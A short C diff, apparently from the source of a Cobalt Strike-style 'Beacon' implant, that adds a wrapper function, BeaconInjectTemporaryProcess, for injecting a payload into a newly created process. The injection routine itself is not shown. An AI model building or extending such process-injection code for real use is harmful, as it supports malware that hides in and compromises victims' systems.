@@ -125,6 +125,7 @@ typedef enum _SECTION_INHERIT {
 	ViewUnmap = 2
 } SECTION_INHERIT, * PSECTION_INHERIT;
 typedef NTSTATUS(NTAPI* FN_NTDLL_NTMAPVIEWOFSECTION)(_In_ HANDLE SectionHandle, _In_ HANDLE ProcessHandle, _Inout_ PVOID* BaseAddress, _In_ ULONG_PTR ZeroBits, _In_ SIZE_T CommitSize, _Inout_opt_ PLARGE_INTEGER SectionOffset, _Inout_ PSIZE_T ViewSize, _In_ SECTION_INHERIT InheritDisposition, _In_ ULONG AllocationType, _In_ ULONG Win32Protect);
+
 BOOL IsWow64ProcessEx(HANDLE hProcess)
 {
 	HMODULE hModule = GetModuleHandleA("kernel32");
@@ -727,4 +728,9 @@ void BeaconInjectProcessInternal(PROCESS_INFORMATION* processInfo, HANDLE hProce
 void BeaconInjectProcess(HANDLE hProcess, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len)
 {
 	BeaconInjectProcessInternal(NULL, hProcess, pid, payload, p_len, p_offset, arg, a_len);
+}
+
+void   BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload, int p_len, int p_offset, char* arg, int a_len)
+{
+	BeaconInjectProcessInternal(pInfo, pInfo->hProcess, pInfo->dwProcessId, payload, p_len, p_offset, arg, a_len);
 }
